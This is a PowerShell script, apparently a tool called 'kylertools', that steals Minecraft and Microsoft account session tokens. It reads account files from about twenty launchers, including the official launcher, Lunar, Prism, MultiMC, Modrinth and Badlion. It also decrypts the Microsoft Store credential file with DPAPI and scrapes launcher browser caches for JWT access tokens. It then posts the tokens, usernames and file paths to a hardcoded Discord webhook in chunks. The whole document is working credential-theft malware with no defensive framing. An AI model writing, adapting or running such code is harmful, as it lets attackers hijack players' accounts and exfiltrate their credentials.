$webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
$h = @{ "Content-Type" = "application/json" }

Add-Type -AssemblyName System.Security -EA 0

# test ping
try{
    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
}catch{}

$found = @()
$seen = @{}

# looser regex, length check filters junk
$jwtRegex = "eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"

function Add-Token {
    param($tok, $user, $src)
    if(-not $tok){ return }
    if($tok.Length -lt 100){ return }
    if($tok -notmatch "^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+$"){ return }
    if($seen.ContainsKey($tok)){ return }
    $seen[$tok] = $true
    $script:found += "user: $user`nssid: $tok`nfile: $src`n"
}

# 1. known launcher account files
$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json"
)

foreach($p in $paths){
    if(Test-Path $p){
        try{
            $raw = Get-Content $p -Raw
            try{
                $j = $raw | ConvertFrom-Json
                if($j.accounts){
                    $j.accounts.PSObject.Properties | %{
                        $a = $_.Value
                        $uname = "unknown"
                        if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
                        elseif($a.username){ $uname = $a.username }
                        if($a.accessToken){ Add-Token $a.accessToken $uname $p }
                    }
                }
            }catch{}
            [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
        }catch{}
    }
}

# 2. decrypt MSA credential bin
$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $bytes = [IO.File]::ReadAllBytes($bin)
        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
        $txt = [Text.Encoding]::UTF8.GetString($dec)
        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value "unknown" $bin }
    }catch{}
}

# 3. deep scan launcher folders
$roots = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.lunarclient",
    "$env:APPDATA\ModrinthApp",
    "$env:APPDATA\PrismLauncher",
    "$env:APPDATA\MultiMC",
    "$env:APPDATA\xmcl",
    "$env:APPDATA\.technic",
    "$env:APPDATA\.feather"
)

foreach($r in $roots){
    if(Test-Path $r){
        try{
            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","*.auth.json" -EA 0 | %{
                if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

# 4. modpack profile configs
$profileRoots = @(
    "$env:APPDATA\ModrinthApp\profiles",
    "$env:APPDATA\PrismLauncher\instances",
    "$env:APPDATA\MultiMC\instances",
    "$env:APPDATA\.minecraft\config",
    "$env:APPDATA\.minecraft\versions"
)

foreach($pr in $profileRoots){
    if(Test-Path $pr){
        try{
            Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                try{
                    $pj = $c | ConvertFrom-Json
                    if($pj.accounts){
                        $pj.accounts | %{
                            $u = if($_.username){ $_.username } else { "unknown" }
                            if($_.accessToken){ Add-Token $_.accessToken $u $_.FullName }
                        }
                    }
                }catch{}
                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

# 5. chromium localstorage
$webcaches = @(
    "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
    "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
    "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
)

foreach($lc in $webcaches){
    if(Test-Path $lc){
        try{
            Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | %{
                if($_.Length -gt 5mb){ return }
                $b = [IO.File]::ReadAllBytes($_.FullName)
                $s = [Text.Encoding]::UTF8.GetString($b)
                [regex]::Matches($s, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

# rate limit safe send function
function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{
        title = $title
        description = "``````$desc``````"
        color = $color
        timestamp = (Get-Date).ToString("o")
    }
    if($footerText){ $embed.footer = @{ text = $footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10

    $maxRetries = 3
    $attempt = 0
    while($attempt -lt $maxRetries){
        $attempt++
        try{
            $resp = iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 15 -PassThru -EA 0
            if($resp.StatusCode -eq 429){
                $wait = 3
                try{
                    $ra = $resp.Headers['Retry-After']
                    if($ra){ $wait = [double]$ra }
                }catch{}
                Start-Sleep -Seconds ($wait + 1)
                continue
            }
            return
        }catch{
            Start-Sleep -Seconds 2
        }
    }
}

# send tokens only (no debug on prod)
if($found.Count -eq 0){
    $found = "nothin found bro"
}

$joined = $found -join "`n"

$limit = 1700
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){
    $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
}

$n = 0
foreach($c in $chunks){
    $n++
    Send-Embed -title "mc tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
    Start-Sleep -Seconds 2
}
